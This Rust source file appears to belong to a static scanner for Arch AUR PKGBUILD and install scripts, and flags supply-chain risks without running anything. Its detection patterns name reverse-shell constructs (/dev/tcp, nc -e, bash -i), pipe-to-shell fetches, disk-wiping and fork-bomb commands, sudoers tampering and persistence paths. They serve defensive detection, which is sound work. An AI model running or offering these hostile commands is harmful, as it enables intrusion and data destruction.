//! Static analysis of a package's build sources: the `PKGBUILD` plus any
//! `.install` scriptlets, combined with AUR metadata.
//!
//! The analyzer never executes anything. It layers three passes:
//! 1. An AST pass ([`crate::astscan`]) that robustly detects `eval` and
//!    pipe-into-shell even through quoting/comments/here-docs. A textual
//!    fallback covers the rare case the grammar fails to load.
//! 2. Line/textual rules for source URLs, checksums, `/tmp` staging, `chmod`,
//!    download-then-exec, and `git clone`.
//! 3. Metadata rules (votes, maintainer age, staleness) and approval-diff
//!    tracking.
//!
//! Pattern matching is best-effort: a clean report means "no known-bad shapes,"
//! not "proven safe."

use crate::astscan;
use crate::aur::PackageInfo;
use crate::config::Config;
use crate::diff::{self, Approval};
use crate::i18n::{self, Lang};
use crate::report::{Finding, Report, Risk, Severity, SourceHost};
use crate::{decode, ioc, taint};
use chrono::{DateTime, Utc};
use std::collections::HashMap;

/// Built-in trusted host suffixes. User config can extend this set.
const TRUSTED_HOSTS: &[&str] = &[
    "github.com",
    "gitlab.com",
    "archlinux.org",
    "sourceforge.net",
    "gnu.org",
    "kernel.org",
    "pypi.org",
    "npmjs.com",
    "crates.io",
];

/// The build inputs to analyze: the `PKGBUILD` and any associated `.install`
/// scripts (`(filename, body)`).
#[derive(Debug, Clone, Default)]
pub struct PkgSources {
    /// Raw `PKGBUILD` text.
    pub pkgbuild: String,
    /// `(name, body)` for each `.install` scriptlet referenced by the package.
    pub install_scripts: Vec<(String, String)>,
}

impl PkgSources {
    /// Convenience constructor from just a `PKGBUILD` (no install scripts).
    pub fn from_pkgbuild(pkgbuild: impl Into<String>) -> Self {
        PkgSources {
            pkgbuild: pkgbuild.into(),
            install_scripts: Vec::new(),
        }
    }
}

/// Which analysis passes run, and how aggressively.
///
/// The default already runs every high-precision pass (decode-and-rescan, IOC +
/// wallet, taint, and version/maintainer delta). `--max` additionally enables
/// the noisier heuristics (`ENCODED_BLOB`, `HIGH_ENTROPY_BLOB`). Individual
/// passes can be disabled with the matching `--no-*` flag.
#[derive(Debug, Clone, Copy)]
pub struct ScanOpts {
    /// T1.1/T1.4 — decode base64/hex blobs and rescan; entropy at `--max`.
    pub decode: bool,
    /// T1.2 — constant-fold anti-evasion (unquote/IFS/escape folding).
    pub normalize: bool,
    /// T2.2 — known-bad indicators + crypto-wallet detection.
    pub ioc: bool,
    /// T1.3 — taint from untrusted input to an execution sink.
    pub taint: bool,
    /// T2.3 — version delta with new risk + maintainer change.
    pub delta: bool,
    /// Maximum scrutiny: enables the higher-false-positive heuristics.
    pub max: bool,
    /// Emit informational findings about which deep passes ran.
    pub verbose: bool,
}

impl Default for ScanOpts {
    fn default() -> Self {
        ScanOpts {
            decode: true,
            normalize: true,
            ioc: true,
            taint: true,
            delta: true,
            max: false,
            verbose: false,
        }
    }
}

impl ScanOpts {
    /// `--max`: every pass on, at full sensitivity.
    pub fn max() -> Self {
        ScanOpts {
            max: true,
            ..Self::default()
        }
    }
}

/// Run the full analysis.
///
/// - `meta`: AUR RPC metadata, or `None` for local (`--file`) analysis.
/// - `sources`: the `PKGBUILD` and `.install` scripts.
/// - `config`: user configuration (extra trusted domains, ignored codes).
/// - `prior_digest`: digest from a previous approval, for change detection.
/// - `now`: reference time (injected for deterministic tests).
pub fn analyze(
    meta: Option<&PackageInfo>,
    sources: &PkgSources,
    config: &Config,
    prior_digest: Option<&str>,
    now: DateTime<Utc>,
) -> Report {
    let prior = prior_digest.map(|d| Approval {
        digest: d.to_string(),
        ..Approval::default()
    });
    analyze_with(
        meta,
        sources,
        config,
        prior.as_ref(),
        now,
        ScanOpts::default(),
    )
}

/// Like [`analyze`], but with an explicit [`ScanOpts`] (deep-pass selection) and
/// a full prior [`Approval`] record for version/maintainer delta tracking.
pub fn analyze_with(
    meta: Option<&PackageInfo>,
    sources: &PkgSources,
    config: &Config,
    prior: Option<&Approval>,
    now: DateTime<Utc>,
    opts: ScanOpts,
) -> Report {
    let text = &sources.pkgbuild;
    let lang = config.ui.lang;
    let mut findings = Vec::new();
    let host_sources = extract_sources(text, config);

    scan_script(text, &host_sources, config, &mut findings);
    scan_deep(text, opts, config, &mut findings);
    scan_install_scripts(&sources.install_scripts, opts, config, &mut findings);
    if let Some(m) = meta {
        scan_metadata(m, now, lang, &mut findings);
    }
    scan_history(text, &mut findings);
    scan_diff(sources, prior, meta, opts, &mut findings);

    apply_ignores(text, config, &mut findings);
    dedup(&mut findings);
    localize(lang, &mut findings);

    let (package, version) = identity(meta, text);
    let mut report = Report {
        package,
        version,
        maintainer: meta.and_then(|m| m.maintainer.clone()),
        maintainer_since: meta.and_then(|m| ts_to_rfc3339(m.first_submitted)),
        votes: meta.map_or(0, |m| m.num_votes),
        last_modified: meta.and_then(|m| ts_to_rfc3339(m.last_modified)),
        last_update_human: meta.map_or_else(
            || "—".into(),
            |m| humanize_since(m.last_modified, now, lang),
        ),
        maintainer_since_human: meta.map_or_else(
            || "local".into(),
            |m| humanize_year(m.first_submitted, now, lang),
        ),
        risk: Risk::Clean,
        sources: host_sources,
        findings,
    };
    report.finalize();
    report
}

/// Rewrite finding messages into `lang` using the i18n catalog. English is the
/// authoring language, so it is left untouched; other languages substitute the
/// localized template (keeping the dynamic `arg`), falling back to English when
/// a template is missing.
fn localize(lang: Lang, findings: &mut [Finding]) {
    if lang == Lang::En {
        return;
    }
    for f in findings.iter_mut() {
        if let Some(tpl) = i18n::finding(lang, f.code) {
            f.message = i18n::fill(tpl, f.arg.as_deref());
        }
    }
}

/// Resolve the display name/version from metadata, falling back to PKGBUILD
/// fields for local analysis.
fn identity(meta: Option<&PackageInfo>, text: &str) -> (String, String) {
    if let Some(m) = meta {
        return (m.name.clone(), m.version.clone());
    }
    let name = field_value(text, "pkgname").unwrap_or_else(|| "(local)".into());
    let ver = field_value(text, "pkgver").unwrap_or_default();
    let rel = field_value(text, "pkgrel").unwrap_or_default();
    let version = match (ver.is_empty(), rel.is_empty()) {
        (false, false) => format!("{ver}-{rel}"),
        (false, true) => ver,
        _ => "?".into(),
    };
    (name, version)
}

/// A source entry extracted from the PKGBUILD with its origin line.
#[derive(Debug, Clone)]
struct Source {
    raw: String,
    host: Option<String>,
    scheme: Option<String>,
    line: usize,
    is_vcs: bool,
}

/// Extract distinct classified source hosts.
fn extract_sources(text: &str, config: &Config) -> Vec<SourceHost> {
    let mut seen: Vec<SourceHost> = Vec::new();
    for src in parse_sources(text) {
        if let Some(host) = src.host {
            if !seen.iter().any(|s| s.host == host) {
                let trusted = is_trusted(&host, config);
                seen.push(SourceHost { host, trusted });
            }
        }
    }
    seen
}

/// Low-level parse of every URL-bearing source entry with line tracking.
fn parse_sources(text: &str) -> Vec<Source> {
    let mut out = Vec::new();
    let mut in_array = false;

    for (idx, line) in text.lines().enumerate() {
        let lineno = idx + 1;
        let trimmed = line.trim();

        if !in_array && is_source_assignment(trimmed) {
            in_array = !trimmed.contains(')');
            collect_urls_from(trimmed, lineno, &mut out);
            continue;
        }
        if in_array {
            collect_urls_from(trimmed, lineno, &mut out);
            if trimmed.contains(')') {
                in_array = false;
            }
        }
    }
    out
}

/// Whether a trimmed line begins a `source=(` / `source_x86_64=(` assignment.
fn is_source_assignment(trimmed: &str) -> bool {
    let Some(eq) = trimmed.find('=') else {
        return false;
    };
    let key = &trimmed[..eq];
    (key == "source" || key.starts_with("source_")) && trimmed[eq..].starts_with("=(")
}

/// Pull URL-like tokens out of a source-array fragment.
fn collect_urls_from(fragment: &str, lineno: usize, out: &mut Vec<Source>) {
    for token in fragment.split([' ', '\t', '(', ')', '\'', '"']) {
        let token = token.trim();
        if token.is_empty() {
            continue;
        }
        let url_part = token.rsplit("::").next().unwrap_or(token);
        if let Some(src) = parse_url_token(url_part, lineno) {
            out.push(src);
        }
    }
}

/// Parse a single token into a [`Source`] if it looks like a URL.
fn parse_url_token(token: &str, lineno: usize) -> Option<Source> {
    let scheme_end = token.find("://")?;
    let prefix = &token[..scheme_end];
    let (is_vcs, scheme) = match prefix.split_once('+') {
        Some((_vcs, sch)) => (true, sch.to_ascii_lowercase()),
        None => (false, prefix.to_ascii_lowercase()),
    };
    let rest = &token[scheme_end + 3..];
    let host_section = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(rest)
        .rsplit('@')
        .next()
        .unwrap_or(rest);
    let host = host_section
        .split(':')
        .next()
        .filter(|h| !h.is_empty())
        .map(|h| h.to_ascii_lowercase());
    Some(Source {
        raw: token.to_string(),
        host,
        scheme: Some(scheme),
        line: lineno,
        is_vcs,
    })
}

/// Whether `host` (or a parent domain) is trusted, including config extras.
fn is_trusted(host: &str, config: &Config) -> bool {
    let on = |list: &[&str]| {
        list.iter()
            .any(|t| host == *t || host.ends_with(&format!(".{t}")))
    };
    if on(TRUSTED_HOSTS) {
        return true;
    }
    config
        .trust
        .extra_domains
        .iter()
        .any(|t| host == t || host.ends_with(&format!(".{t}")))
}

/// Whether a host is a bare IPv4 literal.
fn is_ip_literal(host: &str) -> bool {
    let octets: Vec<&str> = host.split('.').collect();
    octets.len() == 4
        && octets.iter().all(|o| {
            !o.is_empty() && o.bytes().all(|b| b.is_ascii_digit()) && o.parse::<u8>().is_ok()
        })
}

// ---------------------------------------------------------------------------
// Script body rules
// ---------------------------------------------------------------------------

/// Apply AST + textual rules over the PKGBUILD body and its sources.
fn scan_script(text: &str, sources: &[SourceHost], config: &Config, findings: &mut Vec<Finding>) {
    // AST pass (authoritative for eval / pipe-into-shell).
    match astscan::scan(text) {
        Some(mut ast) => findings.append(&mut ast),
        None => textual_exec_fallback(text, findings),
    }

    let parsed_sources = parse_sources(text);
    let has_remote_tarball = parsed_sources.iter().any(|s| !s.is_vcs && s.host.is_some());

    // Source-derived findings.
    for src in &parsed_sources {
        match src.scheme.as_deref() {
            Some("http") | Some("ftp") => {
                let url = truncate(&src.raw, 50);
                findings.push(
                    Finding::at(
                        Severity::Critical,
                        "INSECURE_SOURCE",
                        format!("Insecure source URL: {url}"),
                        src.line,
                    )
                    .with_arg(url),
                )
            }
            _ => {}
        }
        if let Some(host) = &src.host {
            if is_ip_literal(host) {
                findings.push(
                    Finding::at(
                        Severity::Critical,
                        "IP_SOURCE",
                        format!("Source points at a raw IP address: {host}"),
                        src.line,
                    )
                    .with_arg(host.clone()),
                );
            }
        }
        if src.is_vcs {
            findings.push(Finding::at(
                Severity::Info,
                "VCS_SOURCE",
                "Built from VCS HEAD (vcs+ source), not a pinned release",
                src.line,
            ));
        }
    }

    for sh in sources {
        if is_ip_literal(&sh.host) {
            continue;
        }
        if is_url_shortener(&sh.host) {
            findings.push(
                Finding::meta(
                    Severity::Warn,
                    "URL_SHORTENER",
                    format!(
                        "Source uses a URL shortener (hides the real host): {}",
                        sh.host
                    ),
                )
                .with_arg(sh.host.clone()),
            );
        } else if !sh.trusted {
            findings.push(
                Finding::meta(
                    Severity::Warn,
                    "UNKNOWN_SOURCE",
                    format!("Unknown source domain: {}", sh.host),
                )
                .with_arg(sh.host.clone()),
            );
        }
    }

    // SKIP checksums on a non-VCS remote tarball.
    if has_remote_tarball {
        if let Some(line) = skip_checksum_line(text) {
            findings.push(Finding::at(
                Severity::Warn,
                "CHECKSUM_SKIP",
                "Checksum set to SKIP for a downloaded source (integrity unverified)",
                line,
            ));
        }
    }

    // Line-level textual rules.
    let mut downloaded: HashMap<String, usize> = HashMap::new();
    let mut prev_chmod_target: Option<String> = None;
    let mut wrote_tmp = false;

    for (idx, raw_line) in text.lines().enumerate() {
        let lineno = idx + 1;
        let line = strip_comment(raw_line);
        let lower = line.to_ascii_lowercase();
        if lower.trim().is_empty() {
            continue;
        }

        // Download to a file (no pipe), tracked for later exec.
        if (lower.contains("curl") || lower.contains("wget")) && !lower.contains('|') {
            if let Some(file) = download_target(&lower) {
                downloaded.insert(file, lineno);
            }
        }
        // Execute a previously downloaded file → download-then-run.
        for (file, _dl) in downloaded.clone() {
            if executes_target(&lower, &file) && !lower.contains("curl") && !lower.contains("wget")
            {
                findings.push(Finding::at(
                    Severity::Critical,
                    "DOWNLOAD_EXEC",
                    "Downloaded file executed (fetch-then-run)",
                    lineno,
                ));
                downloaded.remove(&file);
                break;
            }
        }

        // chmod +x <f> then run <f>.
        if let Some(target) = chmod_exec_target(&lower) {
            if let Some(prev) = &prev_chmod_target {
                if executes_target(&lower, prev) {
                    findings.push(Finding::at(
                        Severity::Critical,
                        "CHMOD_EXEC",
                        "File made executable and run immediately",
                        lineno,
                    ));
                }
            }
            prev_chmod_target = Some(target);
        } else if let Some(prev) = prev_chmod_target.take() {
            if executes_target(&lower, &prev) {
                findings.push(Finding::at(
                    Severity::Critical,
                    "CHMOD_EXEC",
                    "File made executable and run immediately",
                    lineno,
                ));
            }
        }

        // /tmp staging then execution.
        if mentions_tmp(&lower) {
            if executes_from_tmp(&lower) && wrote_tmp {
                findings.push(Finding::at(
                    Severity::Warn,
                    "TMP_EXEC",
                    "Executes a file staged in /tmp",
                    lineno,
                ));
            }
            if writes_to_tmp(&lower) {
                wrote_tmp = true;
            }
        }

        // git clone of an untrusted repo.
        if lower.contains("git clone") {
            if let Some(host) = first_url_host(&line) {
                if !is_trusted(&host, config) {
                    findings.push(
                        Finding::at(
                            Severity::Warn,
                            "GIT_CLONE_UNKNOWN",
                            format!("git clone of an untrusted repo: {host}"),
                            lineno,
                        )
                        .with_arg(host),
                    );
                }
            }
        }

        // High-signal dangerous-command patterns.
        scan_dangerous_line(&lower, &line, lineno, findings);

        // YARA-style signature database (miners, exfil, persistence, …) plus any
        // user-defined `[signatures]` rules.
        crate::rules::scan_line(&lower, lineno, findings);
        crate::rules::scan_custom(&lower, lineno, &config.signatures.custom, findings);
    }

    // install() function or install= directive present.
    if has_function(text, "install") || mentions_install_directive(text) {
        findings.push(Finding::meta(
            Severity::Warn,
            "INSTALL_HOOK",
            "Package ships an install scriptlet (runs as root on install)",
        ));
    }

    scan_pkgver(text, findings);
    scan_pgp(text, findings);
}

/// `pkgver()` is executed by `makepkg` during the build. If its body fetches
/// the network or evaluates code, that is remote-code-execution surface dressed
/// up as version detection.
fn scan_pkgver(text: &str, findings: &mut Vec<Finding>) {
    let Some((body, line)) = function_body(text, "pkgver") else {
        return;
    };
    let lower = body.to_ascii_lowercase();
    const RCE: &[&str] = &[
        "curl ",
        "wget ",
        "eval ",
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "/dev/tcp/",
        "nc ",
        "base64 -d",
    ];
    if let Some(hit) = RCE.iter().find(|m| lower.contains(**m)) {
        let token = hit.trim();
        findings.push(
            Finding::at(
                Severity::Critical,
                "PKGVER_EXEC",
                format!("pkgver() runs code at build time ({token})"),
                line,
            )
            .with_arg(token.to_string()),
        );
    }
}

/// Flag downloaded sources whose integrity rests on a PGP signature when no
/// `validpgpkeys` is declared, and PGP keys fetched from a keyserver at build
/// time (trust-on-first-use the attacker controls).
fn scan_pgp(text: &str, findings: &mut Vec<Finding>) {
    let has_sig_source = parse_sources(text)
        .iter()
        .any(|s| s.raw.ends_with(".sig") || s.raw.ends_with(".asc") || s.raw.contains(".sig?"));
    let has_validpgpkeys = field_value(text, "validpgpkeys")
        .map(|v| !v.trim().is_empty() && v.trim() != "()")
        .unwrap_or(false)
        || text.contains("validpgpkeys=(") && !text.contains("validpgpkeys=()");
    if has_sig_source && !has_validpgpkeys {
        findings.push(Finding::meta(
            Severity::Warn,
            "MISSING_PGP",
            "Source ships a PGP signature but no validpgpkeys is set (unverifiable)",
        ));
    }
    for (idx, raw) in text.lines().enumerate() {
        let lower = strip_comment(raw).to_ascii_lowercase();
        if (lower.contains("gpg") || lower.contains("--recv-key") || lower.contains("--recv-keys"))
            && (lower.contains("--keyserver")
                || lower.contains("--recv-key")
                || lower.contains("hkp://")
                || lower.contains("keys.openpgp.org"))
        {
            findings.push(Finding::at(
                Severity::Warn,
                "PGP_KEYSERVER_FETCH",
                "Imports a PGP key from a keyserver at build time (unpinned trust)",
                idx + 1,
            ));
            break;
        }
    }
}

/// List of URL-shortener hosts that hide the real download origin.
const URL_SHORTENERS: &[&str] = &[
    "bit.ly",
    "tinyurl.com",
    "goo.gl",
    "t.co",
    "ow.ly",
    "is.gd",
    "buff.ly",
    "rebrand.ly",
    "cutt.ly",
    "shorturl.at",
];

/// Whether `host` is a known URL shortener.
fn is_url_shortener(host: &str) -> bool {
    URL_SHORTENERS.contains(&host)
}

/// Detect high-signal dangerous patterns on a single (comment-stripped) line.
///
/// `lower` is the lower-cased line; `line` preserves original case for path
/// extraction.
fn scan_dangerous_line(lower: &str, line: &str, lineno: usize, findings: &mut Vec<Finding>) {
    // Reverse shells: /dev/tcp redirection, netcat exec, interactive bash to a
    // socket, mkfifo+sh backpipe.
    if lower.contains("/dev/tcp/")
        || lower.contains("/dev/udp/")
        || (lower.contains("nc ") && (lower.contains("-e") || lower.contains("--exec")))
        || (lower.contains("ncat") && lower.contains("-e"))
        || (lower.contains("bash -i") && (lower.contains("/dev/") || lower.contains(">&")))
        || (lower.contains("mkfifo") && lower.contains("| ") && pipes_to_shell(lower))
    {
        findings.push(Finding::at(
            Severity::Critical,
            "REVERSE_SHELL",
            "Reverse-shell pattern detected",
            lineno,
        ));
    }

    // setuid bit.
    if lower.contains("chmod")
        && (lower.contains("u+s")
            || lower.contains("+s ")
            || word_present(lower, "4755")
            || word_present(lower, "6755"))
    {
        findings.push(Finding::at(
            Severity::Critical,
            "SUID_BIT",
            "Sets the setuid bit (privilege escalation risk)",
            lineno,
        ));
    }

    // Destructive commands.
    if is_destructive(lower) {
        findings.push(Finding::at(
            Severity::Critical,
            "DESTRUCTIVE",
            "Destructive command detected",
            lineno,
        ));
    }

    // User/privilege tampering.
    if lower.contains("useradd")
        || lower.contains("usermod")
        || lower.contains("/etc/sudoers")
        || lower.contains("visudo")
        || (lower.contains("passwd") && lower.contains("root"))
    {
        findings.push(Finding::at(
            Severity::Critical,
            "USER_MGMT",
            "Modifies users/sudoers",
            lineno,
        ));
    }

    // Encoded/inline interpreter payloads.
    if (lower.contains("python") || lower.contains("perl") || lower.contains("ruby"))
        && lower.contains(" -c")
        && (lower.contains("exec(") || lower.contains("b64decode") || lower.contains("base64"))
    {
        findings.push(Finding::at(
            Severity::Critical,
            "PYTHON_ENC_EXEC",
            "Interpreter runs an encoded/inline payload",
            lineno,
        ));
    }

    // Writes into system paths outside the package staging dirs.
    if let Some(path) = system_path_write(lower, line) {
        findings.push(
            Finding::at(
                Severity::Critical,
                "SYSTEM_PATH_WRITE",
                format!("Writes outside the package dir into a system path: {path}"),
                lineno,
            )
            .with_arg(path),
        );
    }

    // User-persistence locations.
    if let Some(path) = home_persist_target(lower) {
        findings.push(
            Finding::at(
                Severity::Warn,
                "HOME_PERSIST",
                format!("Touches a user persistence path: {path}"),
                lineno,
            )
            .with_arg(path),
        );
    }

    // Anti-forensic commands.
    if lower.contains("history -c")
        || (lower.contains("chattr") && lower.contains("+i"))
        || (lower.contains("shred") && (lower.contains("log") || lower.contains("history")))
        || lower.contains("unset hist")
    {
        findings.push(Finding::at(
            Severity::Warn,
            "ANTI_FORENSIC",
            "Anti-forensic command (history/log tampering)",
            lineno,
        ));
    }

    // Obfuscation markers.
    if lower.contains("${ifs}") || has_hex_escapes(lower) {
        findings.push(Finding::at(
            Severity::Warn,
            "OBFUSCATION",
            "Obfuscation pattern (hex escapes or IFS splitting)",
            lineno,
        ));
    }
}

/// Whether the line is a clearly destructive command.
fn is_destructive(lower: &str) -> bool {
    let rm_root = lower.contains("rm ")
        && (lower.contains("-rf")
            || lower.contains("-fr")
            || (lower.contains("-r") && lower.contains("-f")))
        && (lower.contains(" /")
            && (lower.contains(" / ")
                || lower.contains(" /*")
                || lower.contains("$home")
                || lower.contains(" ~")
                || lower.ends_with(" /")));
    let dd_disk = lower.contains("dd ")
        && lower.contains("of=/dev/")
        && (lower.contains("/dev/sd") || lower.contains("/dev/nvme") || lower.contains("/dev/vd"));
    let mkfs = lower.contains("mkfs") && lower.contains("/dev/");
    let fork_bomb = lower.replace(' ', "").contains(":(){:|:&};:");
    rm_root || dd_disk || mkfs || fork_bomb
}

/// If the line writes (`>`, `cp`, `mv`, `tee`, `install -D`) to a system path
/// outside `$pkgdir`/`$srcdir`, return that path.
fn system_path_write(lower: &str, line: &str) -> Option<String> {
    const SYS_PREFIXES: &[&str] = &[
        "/etc/", "/usr/", "/bin/", "/sbin/", "/boot/", "/lib/", "/opt/",
    ];
    let writes = lower.contains('>')
        || lower.starts_with("cp ")
        || lower.contains(" cp ")
        || lower.starts_with("mv ")
        || lower.contains(" mv ")
        || lower.contains("tee ")
        || lower.contains("install -")
        || lower.contains("ln -s");
    if !writes {
        return None;
    }
    // Skip writes that are clearly into the package staging area.
    for token in line.split_whitespace() {
        let tok = token.trim_matches(['"', '\'', '>', '<', '|', ';', '&', '(', ')']);
        if SYS_PREFIXES.iter().any(|p| tok.starts_with(p))
            && !tok.contains("$pkgdir")
            && !tok.contains("${pkgdir")
            && !tok.contains("$srcdir")
            && !tok.contains("${srcdir")
        {
            return Some(tok.to_string());
        }
    }
    None
}

/// If the line touches a user-persistence path, return it.
fn home_persist_target(lower: &str) -> Option<String> {
    const PERSIST: &[&str] = &[
        ".bashrc",
        ".bash_profile",
        ".zshrc",
        ".profile",
        ".ssh/authorized_keys",
        ".ssh/",
        "crontab",
        "/etc/cron",
        ".config/autostart",
        ".xprofile",
    ];
    // Only when the line also writes/appends/installs something.
    let writes = lower.contains(">>")
        || lower.contains('>')
        || lower.contains("tee ")
        || lower.contains("crontab ")
        || lower.contains("cp ")
        || lower.contains("install ");
    if !writes {
        return None;
    }
    PERSIST
        .iter()
        .find(|p| lower.contains(*p))
        .map(|p| p.to_string())
}

/// Whether the line contains `\xNN` hex escape sequences (common obfuscation).
fn has_hex_escapes(lower: &str) -> bool {
    let bytes = lower.as_bytes();
    let mut count = 0;
    let mut i = 0;
    while i + 3 < bytes.len() {
        if bytes[i] == b'\\'
            && bytes[i + 1] == b'x'
            && bytes[i + 2].is_ascii_hexdigit()
            && bytes[i + 3].is_ascii_hexdigit()
        {
            count += 1;
            if count >= 3 {
                return true;
            }
            i += 4;
        } else {
            i += 1;
        }
    }
    false
}

/// Textual fallback for eval / pipe-into-shell when the AST pass is
/// unavailable. Mirrors the previous heuristics.
fn textual_exec_fallback(text: &str, findings: &mut Vec<Finding>) {
    for (idx, raw) in text.lines().enumerate() {
        let lineno = idx + 1;
        let lower = strip_comment(raw).to_ascii_lowercase();
        if word_present(&lower, "eval") {
            findings.push(Finding::at(
                Severity::Critical,
                "EVAL",
                "Use of `eval`",
                lineno,
            ));
        }
        if pipes_to_shell(&lower) {
            if lower.contains("base64") || lower.contains("xxd") {
                findings.push(Finding::at(
                    Severity::Critical,
                    "BASE64_PIPE_SH",
                    "Decoded payload piped into a shell",
                    lineno,
                ));
            }
            if lower.contains("curl") || lower.contains("wget") {
                findings.push(Finding::at(
                    Severity::Critical,
                    "CURL_PIPE_SH",
                    "Remote script piped into a shell",
                    lineno,
                ));
            }
        }
    }
}

/// Scan each `.install` script (root-privileged hooks) with the AST pass.
/// Tier 1/2 deep passes gated by [`ScanOpts`]. `--max` turns on the noisier
/// heuristics inside [`decode`]; the precise passes run by default.
fn scan_deep(text: &str, opts: ScanOpts, config: &Config, findings: &mut Vec<Finding>) {
    if opts.decode {
        decode::scan(text, opts.max, findings);
    }
    if opts.normalize {
        crate::normalize::scan(text, findings);
    }
    if opts.ioc {
        ioc::scan(text, &config.ioc.hosts, findings);
    }
    if opts.taint {
        taint::scan(text, findings);
    }
    if opts.verbose {
        findings.push(
            Finding::meta(
                Severity::Info,
                "SCAN_PROFILE",
                format!(
                    "Deep scan profile — decode={} normalize={} ioc={} taint={} delta={} max={}",
                    opts.decode, opts.normalize, opts.ioc, opts.taint, opts.delta, opts.max
                ),
            )
            .with_arg(if opts.max { "max" } else { "standard" }.to_string()),
        );
    }
}

fn scan_install_scripts(
    scripts: &[(String, String)],
    opts: ScanOpts,
    config: &Config,
    findings: &mut Vec<Finding>,
) {
    for (name, body) in scripts {
        let sub = astscan::scan(body).unwrap_or_default();
        for f in sub {
            findings.push(Finding::meta(
                f.severity,
                f.code,
                format!("in {name}: {}", f.message),
            ));
        }
        // Run the Tier 1/2 deep passes over the root-privileged scriptlet too.
        let mut deep = Vec::new();
        scan_deep(
            body,
            ScanOpts {
                verbose: false,
                ..opts
            },
            config,
            &mut deep,
        );
        for f in deep {
            findings.push(Finding::meta(
                f.severity,
                f.code,
                format!("in {name}: {}", f.message),
            ));
        }
        // Install scriptlets run as root, so apply the full line-level rule set
        // (destructive/reverse-shell heuristics + the signature database) in
        // addition to the AST pass, and flag any network fetch.
        let mut flagged_network = false;
        for (idx, raw) in body.lines().enumerate() {
            let line = strip_comment(raw);
            let lower = line.to_ascii_lowercase();
            if lower.trim().is_empty() {
                continue;
            }
            let lineno = idx + 1;
            if !flagged_network && (lower.contains("curl") || lower.contains("wget")) {
                findings.push(
                    Finding::meta(
                        Severity::Warn,
                        "INSTALL_NETWORK",
                        format!("in {name}: network access from an install scriptlet"),
                    )
                    .with_arg(name.clone()),
                );
                flagged_network = true;
            }
            scan_dangerous_line(&lower, &line, lineno, findings);
            crate::rules::scan_line(&lower, lineno, findings);
            crate::rules::scan_custom(&lower, lineno, &config.signatures.custom, findings);
        }
    }
}

// ---------------------------------------------------------------------------
// Metadata + history + diff
// ---------------------------------------------------------------------------

/// Maintainer-age and community-trust signals.
fn scan_metadata(pkg: &PackageInfo, now: DateTime<Utc>, lang: Lang, findings: &mut Vec<Finding>) {
    if let Some(since) = DateTime::<Utc>::from_timestamp(pkg.first_submitted, 0) {
        let months = (now - since).num_days() as f64 / 30.44;
        if months < 6.0 {
            let age = humanize_since(pkg.first_submitted, now, lang);
            findings.push(
                Finding::meta(
                    Severity::Warn,
                    "NEW_MAINTAINER",
                    format!("Young package/maintainer ({age})"),
                )
                .with_arg(age),
            );
        }
    }
    if pkg.num_votes < 5 {
        findings.push(
            Finding::meta(
                Severity::Warn,
                "LOW_VOTES",
                format!("Low community trust ({} votes)", pkg.num_votes),
            )
            .with_arg(pkg.num_votes.to_string()),
        );
    }
    if let Some(modified) = DateTime::<Utc>::from_timestamp(pkg.last_modified, 0) {
        if (now - modified).num_days() > 365 {
            let age = humanize_since(pkg.last_modified, now, lang);
            findings.push(
                Finding::meta(Severity::Info, "STALE", format!("Last updated {age}")).with_arg(age),
            );
        }
    }
    // Orphaned: no maintainer means no one is accountable for what ships.
    if pkg.maintainer.is_none() {
        findings.push(Finding::meta(
            Severity::Warn,
            "ORPHAN_PACKAGE",
            "Package is orphaned (no maintainer)",
        ));
    }
    // Flagged out-of-date: the pinned sources may no longer match upstream, and
    // a stale recipe is a softer target for a takeover.
    if pkg.out_of_date.is_some() {
        let since = pkg
            .out_of_date
            .and_then(|ts| DateTime::<Utc>::from_timestamp(ts, 0))
            .map(|_| humanize_since(pkg.out_of_date.unwrap(), now, lang))
            .unwrap_or_else(|| "—".into());
        findings.push(
            Finding::meta(
                Severity::Warn,
                "FLAGGED_OUTDATED",
                format!("Flagged out-of-date ({since})"),
            )
            .with_arg(since),
        );
    }
}

/// Weak `pkgrel` churn signal.
fn scan_history(text: &str, findings: &mut Vec<Finding>) {
    if let Some(pkgrel) = field_value(text, "pkgrel") {
        if let Ok(n) = pkgrel.trim().parse::<u32>() {
            if n > 3 {
                findings.push(
                    Finding::meta(
                        Severity::Info,
                        "PKGREL_CHURN",
                        format!("High pkgrel ({n}) — many rebuilds on the same version"),
                    )
                    .with_arg(n.to_string()),
                );
            }
        }
    }
}

/// Compare the current package against a previous approval: content digest
/// (`PKGBUILD_CHANGED`), and — when T2.3 delta tracking is on — a maintainer
/// change (`MAINTAINER_CHANGED`) and newly-introduced risk on a version bump
/// (`DELTA_NEW_RISK`).
fn scan_diff(
    sources: &PkgSources,
    prior: Option<&Approval>,
    meta: Option<&PackageInfo>,
    opts: ScanOpts,
    findings: &mut Vec<Finding>,
) {
    let Some(prior) = prior else {
        return;
    };

    let current = diff::digest(&sources.pkgbuild, &sources.install_scripts);
    let content_changed = current != prior.digest;
    if content_changed {
        findings.push(Finding::meta(
            Severity::Warn,
            "PKGBUILD_CHANGED",
            "PKGBUILD changed since you last approved this package",
        ));
    }

    if !opts.delta {
        return;
    }

    // Maintainer change (RPC metadata vs. stored approval).
    if let (Some(prev), Some(curr)) = (
        prior.maintainer.as_deref(),
        meta.and_then(|m| m.maintainer.as_deref()),
    ) {
        if prev != curr {
            findings.push(
                Finding::meta(
                    Severity::Warn,
                    "MAINTAINER_CHANGED",
                    format!("Maintainer changed since approval: {prev} → {curr}"),
                )
                .with_arg(format!("{prev} → {curr}")),
            );
        }
    }

    // New risk introduced by a version bump: a fresh Warn/Critical finding that
    // was not present (or recorded) when the package was last approved.
    let version_changed = match (meta.map(|m| m.version.as_str()), prior.version.as_deref()) {
        (Some(now), Some(was)) => now != was,
        _ => false,
    };
    if content_changed && version_changed && !prior.codes.is_empty() {
        let mut escalate = false;
        let mut new_codes: Vec<&'static str> = Vec::new();
        for f in findings.iter() {
            if matches!(
                f.code,
                "DELTA_NEW_RISK" | "PKGBUILD_CHANGED" | "MAINTAINER_CHANGED"
            ) {
                continue;
            }
            if f.severity >= Severity::Warn && !prior.codes.iter().any(|c| c == f.code) {
                escalate |= f.severity == Severity::Critical;
                if !new_codes.contains(&f.code) {
                    new_codes.push(f.code);
                }
            }
        }
        if !new_codes.is_empty() {
            let list = new_codes.join(", ");
            let severity = if escalate {
                Severity::Critical
            } else {
                Severity::Warn
            };
            findings.push(
                Finding::meta(
                    severity,
                    "DELTA_NEW_RISK",
                    format!("Version bump introduced new risk ({list})"),
                )
                .with_arg(list),
            );
        }
    }
}

